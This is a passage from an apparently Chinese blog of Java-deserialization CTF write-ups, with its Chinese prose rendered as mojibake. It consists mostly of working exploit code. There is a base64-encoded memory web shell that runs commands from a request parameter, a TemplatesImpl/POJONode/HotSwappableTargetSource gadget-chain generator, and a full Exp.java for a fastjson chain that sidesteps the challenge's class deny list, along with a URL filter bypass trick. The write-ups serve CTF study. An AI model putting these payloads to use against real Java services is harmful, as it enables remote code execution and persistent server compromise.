nVpbGRlckNvbmZpZ3VyYXRpb24BABRCdWlsZGVyQ29uZmlndXJhdGlvbgEADElubmVyQ2xhc3NlcwEACE1lbVNoZWxsAQAPamF2YS9sYW5nL0NsYXNzAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDADAAMEBAAYvc2hlbGwMAMIAxAcAxQwAxgDHDADIAMkMAMoAywEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMwANwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAQamF2YS9sYW5nL09iamVjdAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAA9wcmludFN0YWNrVHJhY2UAIQAnADUAAAAAAAUAAQA2ADcAAQA4AAAAHQABAAEAAAAFKrcAAbEAAAABADkAAAAGAAEAAAATAAEAOgA7AAIAOAAAASEABQAJAAAAqSsSArkAAwIAxgCgBD4SBLgABToEGQTGABIZBLYABhIHtgAImQAFAz4dmQAfBr0ACVkDEgpTWQQSC1NZBSsSArkAAwIAU6cAHAa9AAlZAxIMU1kEEg1TWQUrEgK5AAMCAFM6BbgADhkFtgAPtgAQOga7ABFZGQa3ABISE7YAFDoHGQe2ABWZAAsZB7YAFqcABRIXOggsuQAYAQAZCLYAGSy5ABgBALYAGrEAAAACADkAAAAyAAwAAAAqAAsAKwANACwAFAAtACYALgAoADAAYwAxAHAAMgCAADMAlAA0AJ8ANQCoADcAPAAAAC4ABv0AKAEHAD0fWAcAPv4ALgcAPgcAPwcAQEEHAD3/ABUAAwcAQQcAQgcAQwAAAEQAAAAEAAEARQABAEYARwACADgAAAAZAAAAAwAAAAGxAAAAAQA5AAAABgABAAAAPABEAAAABAABAEgAAQBGAEkAAgA4AAAAGQAAAAQAAAABsQAAAAEAOQAAAAYAAQAAAEEARAAAAAQAAQBIAAgASgA3AAEAOAAAAOoABgAHAAAAf7gAGxIcA7kAHQMAwAAeSyoSH7kAIAIAwAAfTCu2ACESIrYAI00sBLYAJCwrtgAlwAAmThInEigFvQApWQMSKlNZBBIrU7YALDoEBL0ACVkDEi1TuAAuLbkALwIAuQAwAQA6BbsAJ1m3ADE6BisZBRkGGQS2ADKnAAhLKrYANLEAAQAAAHYAeQAzAAIAOQAAAEIAEAAAABcADwAYABsAGQAlABoAKgAbACwAHAAzAB0ASgAeAFcAHwBcACAAYwAhAGwAIgB2ACYAeQAkAHoAJQB+ACcAPAAAAAkAAvcAeQcASwQAAgBMAAAAAgBNAH4AAAASAAIAJgB7AH0ACQCGAHsAwwYJ&quot;</span>;<br>        <span class="hljs-type">byte</span>[] bytes=Base64.getDecoder().decode(s);<br>        <br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <br>        POJONode pojoNode=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        HotSwappableTargetSource hotSwappableTargetSource=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">1</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">2</span>);<br>        <br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(hotSwappableTargetSource,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap.put(hotSwappableTargetSource1,<span class="hljs-string">&quot;2&quot;</span>);<br>        <br>        setFieldValue(hotSwappableTargetSource,<span class="hljs-string">&quot;target&quot;</span>,pojoNode);<br>        setFieldValue(hotSwappableTargetSource1,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;a&quot;</span>));<br>        <br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br>        <br>        POJONode pojoNode1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        HotSwappableTargetSource hotSwappableTargetSource2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">3</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource3=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">4</span>);<br>        <br>        HashMap hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap1.put(hotSwappableTargetSource2,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap1.put(hotSwappableTargetSource3,<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(hotSwappableTargetSource2,<span class="hljs-string">&quot;target&quot;</span>,pojoNode1);<br>        setFieldValue(hotSwappableTargetSource3,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;b&quot;</span>));<br>        <br>        <span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>        <span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap1);<br>        <span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>        System.out.println(Base64.getEncoder().encodeToString(decodemsg));<br><span class="hljs-comment">//        Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) null);</span><br><span class="hljs-comment">//        messagecode.getPayload();</span><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException &#123;<br>        ClassPool classPool=ClassPool.getDefault();<br>        CtClass ctClass=classPool.makeClass(<span class="hljs-string">&quot;Test&quot;</span>);<br>        ctClass.setSuperclass(classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;exec\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®°å¾—URLç¼–ç ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171859812.png" alt="image-20240816171859812"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171950364.png" alt="image-20240816171950364"></p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/uuzeray/article/details/138199481?spm=1001.2014.3001.5501">ã€Webã€‘è®°å½•CISCN 2023 è¥¿å—åŠå†³èµ› seacloudsé¢˜ç›®å¤ç°-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136601197">ã€Webã€‘å…³äºJavaååºåˆ—åŒ–é‚£äº›å®ç°æœºåˆ¶çš„æœ´ç´ é€šè¯†-CSDNåšå®¢</a></p><p><a href="https://p4d0rn.gitbook.io/java/ctf/seacloud">CISCN 2023 è¥¿å—èµ›åŒºåŠå†³èµ› (HessianåŸç”ŸJDK+Kryoååºåˆ—åŒ–) | Java (gitbook.io)</a></p><p><a href="https://www.yuque.com/misery333/sz1apr/wa9d50l7yo1p4s9g">CISCN2023è¥¿å—èµ›åŒºåŠå†³èµ› seaclouds (yuque.com)</a></p><h2 id="è¥¿æ¹–è®ºå‰‘-2022-easy-api"><a href="#è¥¿æ¹–è®ºå‰‘-2022-easy-api" class="headerlink" title="[è¥¿æ¹–è®ºå‰‘ 2022]easy_api"></a>[è¥¿æ¹–è®ºå‰‘ 2022]easy_api</h2><p>æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ï¼Œä¸»è¦æ˜¯å¤ä¹ ä¸€ä¸‹fjå§ã€‚</p><p>å…ˆå®¡è®¡ä¸€ä¸‹æºç ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917145855630.png" alt="image-20240917145855630"></p><p>ç®€å•çš„indexè·¯ç”±ï¼Œæ²¡å•¥å¥½çœ‹çš„ã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917145919252.png" alt="image-20240917145919252"></p><p>æ‰¾åˆ°javaååºåˆ—åŒ–å…¥å£ï¼Œçœ‹ä¸‹libé‡Œéƒ½æœ‰å•¥ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917150027163.png" alt="image-20240917150027163"></p><p>fj1.2.48ï¼Œæ²¡äº‹äº†ï¼Œç›´æ¥æ‰“ã€‚</p><p>è¿™é‡Œæœ‰ä¸ªå°æ’æ›²å°±æ˜¯ç»•åˆ°&#x2F;api&#x2F;testä¸Šï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917150543256.png" alt="image-20240917150543256"></p><p>å…¶å®ä¹Ÿå¾ˆç®€å•ï¼ŒåŒæ–œæ å°±ç»•äº†ï¼š<a href="https://blog.csdn.net/z69183787/article/details/84848751">web.xml filter ç»•è¿‡åŒ¹é…è®¿é—®ï¼ˆé’ˆå¯¹jettyï¼‰_jettyæƒé™ç»•è¿‡-CSDNåšå®¢</a></p><p>fastjsonæœ€ç»å…¸çš„éƒ¨åˆ†æ˜¯è‡ªåŠ¨è§¦å‘getteræ¥getPropertiesåŠ è½½å­—èŠ‚ç ï¼Œå¦‚ä½•è§¦å‘getterå¯ä»¥é€šè¿‡JSON.parseè§¦å‘ï¼Œä¹Ÿå¯ä»¥é€šè¿‡toJSONStringè§¦å‘ï¼Œå¾ˆæœ‰æ„æ€çš„æ˜¯JSONè¿™ä¸ªç±»çš„tostringå°±æ˜¯toJSONStringï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917150458344.png" alt="image-20240917150458344"></p><p>é¢˜ç›®banäº†<code>BadAttributeValueExpException</code>æ¥è§¦å‘tostringï¼Œä¹Ÿbanäº†JNDIçš„ä¸€äº›æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass desc)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.lang.reflect.Proxy&quot;</span>, <span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <span class="hljs-string">&quot;sun.rmi.server.UnicastRef&quot;</span>, <span class="hljs-string">&quot;sun.rmi.transport.LiveRef&quot;</span>, <span class="hljs-string">&quot;sun.rmi.transport.tcp.TCPEndpoint&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.RemoteObject&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.RemoteRef&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>, <span class="hljs-string">&quot;java.rmi.RemoteObjectInvocationHandler&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>, <span class="hljs-string">&quot;java.rmi.registry.Registry&quot;</span>&#125;;<br>        String[] var4 = denyClasses;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">denyClass</span> <span class="hljs-operator">=</span> var4[var6];<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨xstringæ¥è§¦å‘ï¼Œå¤åˆ¶ä¹‹å‰çš„éƒ¨åˆ†å³å¯ã€‚</p><p>gadgetï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">readObject-&gt;hashmap.put<br>-&gt;XString.toString<br>-&gt;JSON.toString<br>-&gt;Templates.getProperties<br></code></pre></td></tr></table></figure><p>XStringåé¢ç›´æ¥æ¥ä¸Šæ¶æ„å­—èŠ‚ç æ‰“äº†ã€‚</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>                ClassPool.getDefault().get(Evil.class.getName()).toBytecode()<br>        &#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Evil&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;jb&quot;</span>, templates);<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br><br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(jsonObject);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>));<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>            outputStream.writeObject(s);<br>            System.out.println(URLEncoder.encode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())),<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>            outputStream.close();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Evil.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 